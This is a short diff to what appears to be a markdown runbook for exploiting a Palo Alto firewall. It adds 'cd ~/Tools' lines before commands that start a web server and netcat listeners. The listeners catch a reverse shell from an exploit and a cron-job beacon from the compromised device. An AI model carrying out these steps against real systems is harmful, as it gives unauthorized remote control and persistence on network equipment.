@@ -123,6 +123,7 @@ nc -lvnp 63842
    Run the below command to start the web server:
 
 ```bash
+cd ~/Tools
 python3 -m http.server 80
 ```
 
@@ -286,13 +287,18 @@ chmod +x netflow.palo netflow.vyatta
 
 1. Open up your terminal, and if you dont already have 4, go to your terminal preferences and change the settings to start with 4 panes.
 2. In one of the terminal panes, set up your initial listener using Netcat to catch the callback shell from the exploit, by running the following command. Be sure to note the port that you are using for this listener, as it will be needed when initiating the exploit.
+
 ```bash
+cd ~/Tools
 nc -lnvp 7837
 ```
 
 3. In another terminal pane, set up a second listener to catch the beacon once the cron job is set up on the compromised Palo. Use the port provided in the *pan_os_comm* script that was created earlier.
 4. Run the following command to start the second listener:
+
+
 ```bash
+cd ~/Tools
 nc -lnvp 63842
 ```
 
